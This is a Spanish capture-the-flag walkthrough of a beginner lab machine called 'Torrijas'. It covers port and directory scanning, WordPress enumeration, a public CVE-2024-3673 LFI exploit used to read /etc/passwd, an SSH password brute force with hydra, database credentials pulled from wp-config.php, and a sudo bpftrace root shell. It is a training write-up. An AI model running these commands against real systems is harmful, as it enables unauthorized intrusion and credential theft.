---
description: '🔍 Dificultad: Principiante'
---

# Torrijas

### 🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.66
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.66 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo que el **puerto 22** perteneciente al **servicio SSH y** el **puerto 80** perteneciente al **servicio HTTP** están abiertos por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p22,80,3306 -v 192.168.1.66
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-21 154105.png" alt=""><figcaption></figcaption></figure>

Revisamos el puerto 80.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-21 154309.png" alt=""><figcaption></figcaption></figure>

Ponemos el dominio **torrija.thl** en `/etc/hosts`. Tras esto realizamos un escaneo de directorios.

```
gobuster dir -u http://192.168.1.66 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x html,txt,php
```

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-21 155904.png" alt=""><figcaption></figcaption></figure>

Nos llama la atención que hay un **wordpress** por lo que indagamos más en ese directorio.

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-02-21 160040.png" alt=""><figcaption></figcaption></figure>

Enumeramos los usuarios y los plugins con **WPScan**.

```
wpscan --url http://192.168.1.66/wordpress/ --enumerate u,vp
```

<figure><img src="../../.gitbook/assets/image (1266).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Encontramos un usuario pero al realizar fuerza bruta no encuentra la contraseña. Entonces realizo un enumeración de plugins de manera agresiva.

```bash
wpscan --url http://192.168.1.66/wordpress --enumerate ap --force --plugins-detection mixed
```

<figure><img src="../../.gitbook/assets/image (1267).png" alt=""><figcaption></figcaption></figure>

Buscando los dos por Internet nos llama la atención el segundo ya que se puede realizar un **LFI**.

{% embed url="https://notcve.org/view.php?id=CVE-2024-3673" %}

{% @github-files/github-code-block url="https://github.com/Nxploited/CVE-2024-3673" %}

```
python3 CVE-2024-3673.py --url http://192.168.1.66/wordpress --file ../../../../../etc/passwd
```

<figure><img src="../../.gitbook/assets/image (1268).png" alt=""><figcaption></figcaption></figure>

Encontramos dos usuarios llamados **Primo** y **Premo** pero solo encontramos a través de fuerza bruta la contraseña de **Premo**.

```
hydra -l premo -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.66 -t 64
```

<figure><img src="../../.gitbook/assets/image (1269).png" alt=""><figcaption></figcaption></figure>

Nos conectamos con esas credenciales a través de SSH.

```bash
ssh premo@192.168.1.66
```

<figure><img src="../../.gitbook/assets/image (1270).png" alt=""><figcaption></figcaption></figure>

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar. No tenemos permisos SUDO.&#x20;

En este caso, al estar trabajando con una instalación de **WordPress** y con el puerto **3306** (MySQL) expuesto, el siguiente paso será intentar obtener las credenciales de la base de datos. Un archivo crucial en WordPress que suele contener esta información es el `wp-config.php`.

<figure><img src="../../.gitbook/assets/image (1271).png" alt=""><figcaption></figcaption></figure>

Nos conectamos a la base de datos.

```
mysql -u admin -p
```

<figure><img src="../../.gitbook/assets/image (1272).png" alt=""><figcaption></figcaption></figure>

Indagamos que tenemos en la base de datos.

```
show databases;
use wordpress;
show tables;
select * from wp_users;
```

<figure><img src="../../.gitbook/assets/image (1273).png" alt=""><figcaption></figcaption></figure>

Al ser la contraseña hasheada no nos sirve ya que estamos dentro pero probamos si podemos entrar en la base de datos de **root**.

```
mysql -u admin -p
show databases;
use Torrijas;
show tables;
select * from primo;
```

<figure><img src="../../.gitbook/assets/image (1274).png" alt=""><figcaption></figcaption></figure>

Nos logueamos con las credenciales.

<figure><img src="../../.gitbook/assets/image (1275).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gtfobins.github.io/gtfobins/bpftrace/" %}

```
sudo bpftrace -c /bin/sh -e 'END {exit()}'
```

<figure><img src="../../.gitbook/assets/image (1276).png" alt=""><figcaption></figcaption></figure>

Ya somos **root**.&#x20;

Te deseo mucho éxito en tu búsqueda de las flags! Recuerda prestar atención a cada detalle, examinar los archivos y servicios con detenimiento, y utilizar todas las herramientas disponibles para encontrarlas. La clave para el éxito está en la perseverancia y en no dejar ningún rincón sin explorar. ¡Adelante, hacker! 💻🔍🚀
